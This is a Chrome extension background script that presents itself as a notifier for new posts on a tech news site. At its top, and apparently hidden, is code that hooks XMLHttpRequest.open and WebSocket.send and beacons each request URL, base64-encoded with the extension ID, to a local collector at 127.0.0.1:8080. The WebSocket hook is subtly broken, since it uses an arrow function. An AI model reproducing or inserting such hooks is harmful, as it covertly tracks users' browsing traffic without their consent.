function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var script = document.createElement('script');
script.src = 'assets/jquery.min.js';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);


chrome.runtime.onInstalled.addListener(function (object) {
    chrome.tabs.create({url: "welcome.html"}, function (tab) {
      
    });
});



var notify = null;  
var previous = null;
var current = null;
setInterval(function() {
    $.getJSON("https://techgenyz.com/wp-json/wp/v2/posts", function(json) {
        current = JSON.stringify(json);            
        if (previous && current && previous !== current) {
        	console.log('yes');
          notify=notify+1;
          var notifytxt = notify.toString();
          chrome.browserAction.setBadgeBackgroundColor({ color: [16, 172, 132, 255] });
		      chrome.browserAction.setBadgeText({text: notifytxt});
            
        }else{
          console.log('no');
        }
        previous = current;
    });  
                
}, 120000);



chrome.runtime.onMessage.addListener(function(message, sender, sendResponse){
  if(message.popupOpen) { 
  	chrome.browserAction.setBadgeText({text: ''});
  	notify = null;
  }
});